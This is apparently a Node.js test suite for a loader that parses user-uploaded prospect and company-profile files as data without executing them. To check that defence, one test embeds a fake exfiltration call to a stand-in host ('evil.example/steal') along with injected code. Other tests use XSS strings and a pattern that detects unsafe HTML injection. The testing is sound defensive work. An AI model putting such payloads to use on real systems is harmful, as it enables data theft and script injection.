"use strict";

/* The data-file loader: it must read user files as DATA and never run them. */
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");

const DataLoader = require("../data-loader.js");
const EquityModel = require("../equity-model.js");

const ROW = { name: "Prospect 1", company: "Company A", title: "Software Engineer", startDate: "2022-03-01" };
const asJs = (rows, profiles) => `window.RAW_PROSPECTS = ${JSON.stringify(rows, null, 2)};${profiles ? `\nwindow.COMPANY_PROFILES = ${JSON.stringify(profiles)};` : ""}\n`;
const parse = (text) => DataLoader.parsePack(text, { asOf: EquityModel.AS_OF });
const read = (...p) => fs.readFileSync(path.join(__dirname, "..", ...p), "utf8");

test("the two shipped templates parse: 3 prospects and 1 valid company profile", () => {
  const prospects = parse(read("templates", "prospects-template.js"));
  assert.equal(prospects.fatal, undefined);
  assert.deepEqual(prospects.counts, { rows: 3, valid: 3, skipped: 0, duplicates: 0 });
  assert.equal(prospects.profiles, null, "the prospects template has no profiles");
  const profiles = parse(read("templates", "company-profiles-template.js"));
  assert.equal(profiles.fatal, undefined);
  assert.equal(profiles.prospects.length, 0, "the company profiles template has no prospects");
  assert.deepEqual(Object.keys(profiles.profiles), ["Example Corp"]);
  assert.deepEqual(EquityModel.validateProfile("Example Corp", profiles.profiles["Example Corp"]).errors, []);
});

test("the two templates together produce estimates end to end", () => {
  const prospects = parse(read("templates", "prospects-template.js"));
  const profiles = parse(read("templates", "company-profiles-template.js"));
  try {
    assert.deepEqual(EquityModel.registerProfiles(profiles.profiles).registered, ["Example Corp"]);
    for (const p of prospects.prospects) {
      const e = EquityModel.estimate(p);
      assert.equal(e.estimated, true, p.name);
      assert.ok(e.net.p50 > 0);
    }
  } finally {
    EquityModel.resetProfiles();
  }
});

test("the sample data pack loads cleanly: 14 fictional prospects and 2 valid company profiles", () => {
  const pack = parse(read("templates", "sample-data-pack.js"));
  assert.equal(pack.fatal, undefined);
  assert.deepEqual(pack.counts, { rows: 14, valid: 14, skipped: 0, duplicates: 0 });
  assert.equal(pack.errors.length, 0);
  assert.equal(pack.prospects.filter((p) => p.founder).length, 1);
  assert.deepEqual(Object.keys(pack.profiles), ["Demo Company A", "Demo Company B"]);
  for (const [name, raw] of Object.entries(pack.profiles)) assert.deepEqual(EquityModel.validateProfile(name, raw).errors, [], name);
});

test("accepts a .js assignment, a plain JSON array, and a JSON object with both lists", () => {
  assert.equal(parse(asJs([ROW])).counts.valid, 1);
  assert.equal(parse(JSON.stringify([ROW])).counts.valid, 1);
  const both = parse(JSON.stringify({ prospects: [ROW], companyProfiles: { X: {} } }));
  assert.equal(both.counts.valid, 1);
  assert.deepEqual(Object.keys(both.profiles), ["X"]);
  const profilesOnly = parse(`window.COMPANY_PROFILES = { "Acme": {} };`);
  assert.equal(profilesOnly.fatal, undefined);
  assert.equal(profilesOnly.prospects.length, 0);
});

test("comments and trailing commas are tolerated, and // inside text is not a comment", () => {
  const text = `// leading comment\n/* block */\nwindow.RAW_PROSPECTS = [\n  { "name": "Prospect 1", "company": "Company A", "title": "Engineer // not a comment https://example.com", "startDate": "2022-03-01", }, // trailing\n];\n`;
  const pack = parse(text);
  assert.equal(pack.fatal, undefined);
  assert.equal(pack.prospects[0].title, "Engineer // not a comment https://example.com");
});

test("the file is NEVER executed: code in it does nothing, and code in place of data is refused", () => {
  delete globalThis.__pwned;
  const sneaky = `window.RAW_PROSPECTS = ${JSON.stringify([ROW])};\nglobalThis.__pwned = "ran";\nprocess.exit(99);\nfetch("https://evil.example/steal");\n`;
  const pack = parse(sneaky);
  assert.equal(pack.counts.valid, 1, "the data is still read");
  assert.equal(globalThis.__pwned, undefined, "the extra statements were not run");

  const asValue = parse(`window.RAW_PROSPECTS = [ (function () { globalThis.__pwned = "ran"; return 1; })() ];`);
  assert.ok(asValue.fatal, "an expression where data should be is rejected");
  assert.match(asValue.fatal, /not valid JSON/);
  assert.equal(globalThis.__pwned, undefined);

  const fnValue = parse(`window.RAW_PROSPECTS = [ { "name": function () {}, "company": "Company A" } ];`);
  assert.ok(fnValue.fatal);
  const quoted = parse(`window.RAW_PROSPECTS = [ { 'name': 'Prospect 1' } ];`);
  assert.match(quoted.fatal, /double quotes/);
});

test("clear errors for empty, oversized, unrecognised and broken files", () => {
  assert.match(parse("").fatal, /empty/);
  assert.match(parse("   \n").fatal, /empty/);
  assert.match(parse("x".repeat(DataLoader.MAX_BYTES + 1)).fatal, /larger than/);
  assert.match(parse("console.log('hello');").fatal, /No prospects found/);
  assert.match(parse(`window.RAW_PROSPECTS = [ { "name": "A" `).fatal, /not closed|brackets/i);
  assert.match(parse(`window.RAW_PROSPECTS = {};`).fatal, /must be a list/);
  assert.match(parse(`window.RAW_PROSPECTS = []; window.COMPANY_PROFILES = [];`).fatal, /COMPANY_PROFILES must be an object|must be an object/);
  const many = Array.from({ length: DataLoader.MAX_ROWS + 1 }, (_, i) => ({ ...ROW, name: `Prospect ${i}` }));
  assert.match(parse(JSON.stringify(many)).fatal, /more than/);
});

test("bad rows are skipped with their row numbers, good rows are kept", () => {
  const pack = parse(asJs([
    ROW,
    { ...ROW, name: "Prospect 2", startDate: "2022-13-45" },
    { ...ROW, name: "Prospect 3", title: 5 },
    { company: "Company A", title: "x", startDate: "2022-03-01" },
    "not an object",
    { ...ROW, name: "Prospect 6", founder: "yes" },
    { ...ROW, name: "Prospect 7", tenure: -3 },
    { ...ROW, name: "Prospect 8" }
  ]));
  assert.equal(pack.counts.valid, 2);
  assert.equal(pack.counts.skipped, 6);
  assert.deepEqual(pack.errors.map((e) => e.row), [2, 3, 4, 5, 6, 7]);
  assert.match(pack.errors[0].message, /startDate/);
  assert.match(pack.errors[2].message, /"name"/);
});

test("duplicates (same company and name) are skipped with a warning", () => {
  const pack = parse(asJs([ROW, { ...ROW }, { ...ROW, company: "Company B" }]));
  assert.equal(pack.counts.valid, 2);
  assert.equal(pack.counts.duplicates, 1);
  assert.match(pack.warnings[0], /duplicate/);
});

test("unknown fields are dropped; text is cleaned and capped; tenure and incomplete-name flags are worked out", () => {
  const pack = parse(asJs([{
    ...ROW,
    name: "  Prospect\u0000 9\n ",
    title: "Engineer ".repeat(60),
    isAdmin: true,
    __proto__: { polluted: true },
    "<script>": "x",
    seniority: "SENIOR",
    startDate: "2020-01-01"
  }, { ...ROW, name: "Single", startDate: "2021-01-01" }]));
  const [first, second] = pack.prospects;
  assert.equal(first.name, "Prospect 9");
  assert.ok(first.title.length <= 200);
  assert.equal(first.seniority, "senior");
  assert.deepEqual(Object.keys(first).sort(), ["company", "department", "name", "seniority", "startDate", "subDepartment", "tenure", "title"]);
  assert.equal(first.nameIncomplete, undefined);
  assert.equal(first.tenure, DataLoader.tenureYears("2020-01-01", EquityModel.AS_OF));
  assert.ok(first.tenure > 6 && first.tenure < 7);
  assert.equal(second.nameIncomplete, true);
  assert.equal({}.polluted, undefined);
});

test("founder, city and explicit tenure are accepted", () => {
  const pack = parse(asJs([{ ...ROW, founder: true, city: "Lisbon, PT", tenure: 3.2 }]));
  assert.equal(pack.prospects[0].founder, true);
  assert.equal(pack.prospects[0].city, "Lisbon, PT");
  assert.equal(pack.prospects[0].tenure, 3.2);
});

test("hostile text is kept as plain text for the page to escape, never altered into markup", () => {
  const pack = parse(asJs([{ ...ROW, name: "<img src=x onerror=alert(1)> Roe", title: "<script>alert(1)</script>" }]));
  assert.equal(pack.prospects[0].title, "<script>alert(1)</script>");
  const app = read("app.js");
  assert.match(app, /esc\(prospect\.name\)/, "the page escapes names");
  assert.match(app, /esc\(eq\.band\.basis\)/, "the page escapes profile-derived text");
});

test("a profile with problems is reported by the model, not the loader (loader passes it through)", () => {
  const pack = parse(asJs([ROW], { Broken: { foundedYear: "x" } }));
  assert.deepEqual(Object.keys(pack.profiles), ["Broken"]);
  assert.ok(EquityModel.validateProfile("Broken", pack.profiles.Broken).errors.length > 0);
});

test("each upload section reads only its own part of a file, so one combined file works in both", () => {
  const combined = parse(read("templates", "sample-data-pack.js"));
  assert.equal(combined.prospects.length, 14);
  assert.deepEqual(Object.keys(combined.profiles), ["Demo Company A", "Demo Company B"]);
  const prospectsOnly = parse(read("templates", "prospects-template.js"));
  assert.ok(prospectsOnly.prospects.length > 0 && !prospectsOnly.profiles);
  const profilesOnly = parse(read("templates", "company-profiles-template.js"));
  assert.ok(profilesOnly.prospects.length === 0 && profilesOnly.profiles);
  const ui = read("data-upload.js");
  assert.match(ui, /This file has company profiles but no prospects/);
  assert.match(ui, /This file has prospects but no company profiles/);
});

test("the upload dialog never injects file content as HTML", () => {
  const ui = read("data-upload.js");
  assert.ok(!/innerHTML\s*=/.test(ui), "no innerHTML assignments");
  assert.ok(!/insertAdjacentHTML|document\.write|eval\(|new Function/.test(ui));
  assert.match(ui, /textContent/);
});
